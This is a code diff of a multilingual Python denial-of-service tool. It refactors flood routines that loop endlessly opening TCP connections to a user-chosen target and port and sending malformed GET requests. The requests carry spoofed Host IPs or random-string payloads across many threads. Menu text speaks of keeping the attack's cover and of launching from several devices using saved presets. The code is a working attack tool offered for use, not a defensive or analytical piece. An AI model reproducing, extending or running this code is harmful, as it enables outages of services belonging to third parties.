@@ -5,13 +5,19 @@ from time import sleep
 import linecache
 import colorama
 import threading
+import random
 import socket
+import string
 
 #def var
-faker = Faker()
+inj = ""
+size = 0
+method = ""
 reqcount = 0
-target = "192.168.0.1"
 port = int("0")
+faker = Faker()
+rngsize = int("0")
+target = "192.168.0.1"
 
 #clear screen
 def clear():
@@ -20,84 +26,64 @@ def clear():
 	else:
 		_ = system('clear')
 
-#launch threading
+#show information
+def info():
+	global reqcount
+	reqcount += 1
+	print(str(reqcount) + " packets sent via port " + str(port))
+
+#threading launch
 def thr():
 	for i in range(threads):
 		thread = threading.Thread(target=dos)
 		thread.start()
 
-#dos port 53
-def dos53():
-	port = int("53")
+#inject fake ip
+def dosfake():
+	global reqcount
+	global method
+	global port
 	while True:
 		fake_ip = faker.ipv4()
 		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 		s.connect((target, port))
-		s.sendto(("GET /" + target + " DNS/1.1\r\n").encode('ascii'), (target, port))
+		s.sendto(("GET /" + target + " " + method + "/1.1\r\n").encode('ascii'), (target, port))
 		s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (target, port))
-		global reqcount
-		reqcount += 1
-		print(str(reqcount) + " packets sent via port " + str(port))
+		info()
 		s.close()
 	thr()
 
-#dos port 80
-def dos80():
-	port = int("80")
+#inject random string
+def dosrng():
+	global reqcount
+	global method
+	global port
+	global size
 	while True:
-		fake_ip = faker.ipv4()
+		rng = ''.join(random.choices(string.ascii_uppercase + string.digits, k = size))
 		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 		s.connect((target, port))
-		s.sendto(("GET /" + target + " HTTP/1.1\r\n").encode('ascii'), (target, port))
-		s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (target, port))
-		global reqcount
-		reqcount += 1
-		print(str(reqcount) + " packets sent via port " + str(port))
+		s.sendto(("GET /" + target + " " + method + "/1.1\r\n").encode('ascii'), (target, port))
+		s.sendto((rng).encode('ascii'), (target, port))
+		info()
 		s.close()
 	thr()
 
-#dos port 443
-def dos443():
-	port = int("443")
+#inject very random string
+def dosrngsize():
+	global reqcount
+	global method
+	global rngsize
+	global port
+	global size
 	while True:
-		fake_ip = faker.ipv4()
+		size = random.randint(1, rngsize)
+		rng = ''.join(random.choices(string.ascii_uppercase + string.digits, k = size))
 		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 		s.connect((target, port))
-		s.sendto(("GET /" + target + " HTTPS/1.1\r\n").encode('ascii'), (target, port))
-		s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (target, port))
-		global reqcount
-		reqcount += 1
-		print(str(reqcount) + " packets sent via port " + str(port))
-		s.close()
-	thr()
-
-#dos port 8000
-def dos8000():
-	port = int("8000")
-	while True:
-		fake_ip = faker.ipv4()
-		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-		s.connect((target, port))
-		s.sendto(("GET /" + target + " iRDMI/1.1\r\n").encode('ascii'), (target, port))
-		s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (target, port))
-		global reqcount
-		reqcount += 1
-		print(str(reqcount) + " packets sent via port " + str(port))
-		s.close()
-	thr()
-
-#dos port 8080
-def dos8080():
-	port = int("8080")
-	while True:
-		fake_ip = faker.ipv4()
-		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-		s.connect((target, port))
-		s.sendto(("GET /" + target + " HTTP/1.1\r\n").encode('ascii'), (target, port))
-		s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (target, port))
-		global reqcount
-		reqcount += 1
-		print(str(reqcount) + " packets sent via port " + str(port))
+		s.sendto(("GET /" + target + " " + method + "/1.1\r\n").encode('ascii'), (target, port))
+		s.sendto((rng).encode('ascii'), (target, port))
+		info()
 		s.close()
 	thr()
 
@@ -161,10 +147,10 @@ def cllogo():
 ################################
 def enmenu():
 
-#main menu
+#main en menu
 	while True:
 		logo()
-		print("Menu:\n1 - Start simple DDOS\n2 - Advanced DDOS\n3 - Options\n4 - Credits\n5 - Exit.")
+		print("Menu:\n1 - Start simple DOS\n2 - Advanced DOS\n3 - Options\n4 - Credits\n5 - Exit")
 		menu = input("Option number: ")
 		
 #start simple dos with info gather
@@ -187,11 +173,33 @@ def enmenu():
 
 #start advanced dos
 			elif(advopt == "2"):
+				cllogo()
 				target = input("Target: ")
 				global port
 				port = int(input("Choose port. Ports available: 53, 80, 443, 8000, 8080. \nPort: "))
 				threads = input("Enter how many threads: ")
-				portsw()
+				global inj
+				while True:
+					cllogo()
+					inj = input("What to inject? A new injection will generate each time a packet is sent.\n1 - Fake ip\n2 - Random string of numbers and letters\nOption number: ")
+					if(inj == "1"):
+						portsw()
+					elif(inj == "2"):
+						cllogo()
+						rngopt = int(input("Enter size of the string. 1 symbol = 1 byte. This is number is crucial, it can either make the attack very efficient or blow its cover.\n1 - Fixed amount of symbols\n2 - Random amount of symbols from 1 to X\nOption number: "))
+						if(rngopt == 1):
+							global size
+							size = int(input("Enter size: "))
+							portsw()
+						elif(rngopt == 2):
+							global rngsize
+							rngsize = int(input("Enter max size: "))
+							portsw()
+						else:
+							throwerr()
+					else:
+						throwerr()
+						
 
 #exit
 			elif(advopt == "3"):
@@ -263,8 +271,8 @@ def enmenu():
 #credits menu		
 		elif(menu=="4"):
 				clcredits()
-				print('''\n275,000 transistors since 1985!\n"Man, this shits lightning fast!"\n''')
-				print("Original DDOS code - neuralnine.com\nSwedish UI - u/4lphafallen\n")
+				print('''275,000 transistors since 1985!\n"Man, this shits lightning fast!"\n''')
+				print("Original DOS algorithm - neuralnine.com\nSwedish UI - u/4lphafallen\n")
 				input("Press Enter to exit to main menu.")
 				clear()
 
@@ -282,35 +290,46 @@ def enmenu():
 ###UA###UA###UA###UA###UA###UA##
 ################################
 def uamenu():
+
+#main menu
 	while True:
 		cllogo()
-		print("Меню:\n1 - Запустити простий DDOS\n2 - Запустити продвинутий DDOS\n3 - Налаштування\n4 - Подяки\n5 - Вихід")
+		print("Меню:\n1 - Запустити простий DOS\n2 - Запустити продвинутий DOS\n3 - Налаштування\n4 - Подяки\n5 - Вихід")
 		menu = input("Номер опції: ")
 		
-#start dos with info gather
+#simple dos with info gather
 		if(menu=="1"):
 			cllogo()
 			target = input("Ціль: ")
 			threads = int(input("Введіть кількість потоків: "))
 			readdefport()
 
-#interpret preset variables
+#advanced dos menu
 		elif(menu=="2"):
 			cllogo()
-			print("Меню продвинутого DDOS:\n1 - Запустити простий DDOS з шаблону\n2 - Запустити продвинутий DDOS\n3 - Вийти")
+			print("Меню продвинутого DOS:\n1 - Запустити простий DOS з шаблону\n2 - Запустити продвинутий DOS\n3 - Вийти")
 			advopt = input("Номер опції: ")
+
+#start preset read func
 			if(advopt == "1"):
 				cllogo()
 				getpreset()
+
+#start advanced dos
 			elif(advopt == "2"):
+				cllogo()
 				target = input("IP цілі: ")
 				threads = input("Введіть кількість потоків: ")
 				port = int(input("Виберіть порт. Доступні порти в цій програмі: 53, 80, 443, 8000, 8080.\nВаш вибір: "))
 				portsw()
+
+#exit
 			elif(advopt == "3"):
 				clear()
 			else:
 				throwerr()
+
+#options screen
 		elif(menu=="3"):
 			cllogo()
 			print("Налаштування:\n1 - Скинути мову\n2 - Зробити шаблон цілі\n3 - Задати новий порт за замовчуванням\n4 - Вихід")
@@ -324,6 +343,8 @@ def uamenu():
 				n = text_file.write("")
 				text_file.close()
 				print("Скидання мови успішне.")
+
+#force user to answer my dumb questions
 				while True:
 					res = input("Вийти зараз? y - так, n - ні: ")
 					if(res=="y"):
@@ -335,7 +356,7 @@ def uamenu():
 						throwerr()
 						logo()
 			
-#preset write
+#create new preset
 			elif(option == "2"):
 				cllogo()
 				print("Ласкаво просимо до мастера створення шаблонів. Ця можливість рідко використовується, але може знадобитись якщо ви хочете запустити атаку з декількох різних пристроїв швидко. Будь ласка, вводіть інформацію жертви обережно.")
@@ -344,7 +365,7 @@ def uamenu():
 				f = open(filename + ".txt", "x")
 				print(filename + ".txt створений.")
 				
-#placeholder
+#get the info from the poor guy
 				target = input("Ціль: ")
 				print("Порт є 80 за замовчуванням.")
 				threads = input("Введіть кількість потоків: ")
@@ -369,8 +390,8 @@ def uamenu():
 				
 		elif(menu=="4"):
 				clcredits()
-				print('''\n275,000 транзисторів з 1985 року!\n"Чувак, ця хрінь швидка як молнія!"\n''')
-				print("Оригінальній код DDOS - neuralnine.com\nШведська мова - u/4lphafallen\n")
+				print('''275,000 транзисторів з 1985 року!\n"Чувак, ця хрінь швидка як молнія!"\n''')
+				print("Оригінальній алгоритм DOS - neuralnine.com\nШведська мова - u/4lphafallen\n")
 				input("Натисніть Enter щоб вийти у меню. Слава Україні!")
 				clear()	
 		elif(menu=="5"):
@@ -389,7 +410,7 @@ def uamenu():
 def rumenu():
 	while True:
 		cllogo()
-		print("Меню:\n1 - Запустить простой DDOS\n2 - Продвинутый DDOS\n3 - Настройки\n4 - Отдельное спасибо\n5 - Выход")
+		print("Меню:\n1 - Запустить простой DOS\n2 - Продвинутый DOS\n3 - Настройки\n4 - Отдельное спасибо\n5 - Выход")
 		menu = input("Номер опции: ")
 		
 #start dos with info gather
@@ -402,12 +423,13 @@ def rumenu():
 #interpret preset variables
 		elif(menu=="2"):
 			cllogo()
-			print("Меню продвинутого DDOS:\n1 - Запустить простой DDOS с шаблона\n2 - Запустить продвинутый DDOS\n3 - Выйти")
+			print("Меню продвинутого DOS:\n1 - Запустить простой DOS с шаблона\n2 - Запустить продвинутый DOS\n3 - Выйти")
 			advopt = input("Номер опции: ")
 			if(advopt == "1"):
 				cllogo()
 				getpreset()
 			elif(advopt == "2"):
+				cllogo()
 				target = input("IP цели: ")
 				threads = input("Введите количество потоков: ")
 				port = int(input("Выбери порт. Доступные порты в этой программе: 53, 80, 443, 8000, 8080.\nВаш выбор: "))
@@ -474,8 +496,8 @@ def rumenu():
 				
 		elif(menu=="4"):
 				clcredits()
-				print('''\n275,000 транзисторов с 1985 года!\n"Чувак, эта херня молниеносна!"\n''')
-				print("Оригинальный код DDOS - neuralnine.com\nШведский интерфейс - u/4lphafallen\n")
+				print('''275,000 транзисторов с 1985 года!\n"Чувак, эта херня молниеносна!"\n''')
+				print("Оригинальный алгоритм DOS - neuralnine.com\nШведский интерфейс - u/4lphafallen\n")
 				input("Нажмите Enter чтобы выйти в меню. Слава Украине!")
 				clear()	
 		elif(menu=="5"):
@@ -494,7 +516,7 @@ def rumenu():
 def semenu():
 	while True:
 		cllogo()
-		print("Meny:\n1 - Starta enkel DDOS\n2 - Avancerad DDOS\n3 - Alternativ\n4 - Krediter\n5 - Avsluta")
+		print("Meny:\n1 - Starta enkel DOS\n2 - Avancerad DOS\n3 - Alternativ\n4 - Krediter\n5 - Avsluta")
 		menu = input("Alternativ nummer: ")
 		
 #start dos with inf gather
@@ -507,12 +529,13 @@ def semenu():
 #interpret preset variables
 		elif(menu=="2"):
 			cllogo()
-			print("Avancerad DDOS meny:\n1 - Starta enkel förinställd DDOS\n2 - Starta avancerad DDOS\n3 - Avsluta")
+			print("Avancerad DOS meny:\n1 - Starta enkel förinställd DOS\n2 - Starta avancerad DOS\n3 - Avsluta")
 			advopt = input("Alternativ nummer: ")
 			if(advopt == "1"):
 				cllogo()
 				getpreset()
 			elif(advopt == "2"):
+				cllogo()
 				target = input("Mål: ")
 				port = int(input("Välj port. Porter tillgängliga: 53, 80, 443, 8000, 8080. \nPort: "))
 				threads = input("Skriv in hur många trådar: ")
@@ -577,8 +600,8 @@ def semenu():
 				
 		elif(menu=="4"):
 				clcredits()
-				print('''\n275.000 transistorer sedan 1985!\n"Mannen, den här skiten är blixtsnabb!"\n''')
-				print("Originala DDOS koden - neuralnine.com\nSvenska UI - u/4lphafallen\n")
+				print('''275.000 transistorer sedan 1985!\n"Mannen, den här skiten är blixtsnabb!"\n''')
+				print("Originala DOS algoritm - neuralnine.com\nSvenska UI - u/4lphafallen\n")
 				input("Tryck Enter för att avsluta till menyn.")
 				clear()	
 		elif(menu=="5"):
@@ -586,10 +609,13 @@ def semenu():
 		else:
 				throwerr()
 
-	
-			
 
-	
+
+
+################################
+#SWITCHES AND SUCH###############
+################################
+
 #switch menus depending on language
 def menusw():
 	global defport
@@ -625,20 +651,36 @@ def throwerr():
 
 #switch dosing algos depending on port chosen/got from .txt
 def portsw():
+	global method
 	global port
 	if(port == 53):
-		dos53()
-	elif(port == 80):
-		dos80()
+		method = "DNS"
+		injsw()
+	elif(port == 80 or port == 8000 or port == 8080):
+		method = "HTTP"
+		injsw()
 	elif(port == 443):
-		dos443()
-	elif(port == 8000):
-		dos8000()
-	elif(port == 8080):
-		dos8080()
+		method = "HTTPS"
+		injsw()
 	else:
 		throwerr()
-									
+
+#injection method switch
+def injsw():
+	global inj
+	global rngsize
+	if(inj == "1"):
+		dosfake()
+	elif(inj == "2"):
+		if(rngsize>0):
+			dosrngsize()
+		elif(rngsize==0):
+			dosrng()
+		else:
+			print("ERR: Couldnt switch brtween injection types!")
+	else:
+		throwerr()
+
 #get all the necessary shit from .txt
 def getpreset():
 	if(lang == "en"):
@@ -681,7 +723,7 @@ lang = lang[:-1]
 #welcome screen n shit
 if (lang == ""):
 	logo()
-	print("Welcome to i386 ddos, my friend.\n\nWe trust you have received the usual lecture from the local System Administrator. It usually boils down to these three things:\n\n# 1) Respect the privacy of others.\n# 2) Think before you type.\n# 3) With great power comes great responsibility.\n")
+	print("Welcome to i386 dos, my friend.\n\nWe trust you have received the usual lecture from the local System Administrator. It usually boils down to these three things:\n\n# 1) Respect the privacy of others.\n# 2) Think before you type.\n# 3) With great power comes great responsibility.\n")
 
 #set new language
 	lang = input("Language/Мова/Язык/Språk \n   en     ua   ru   se\nPlease choose:")
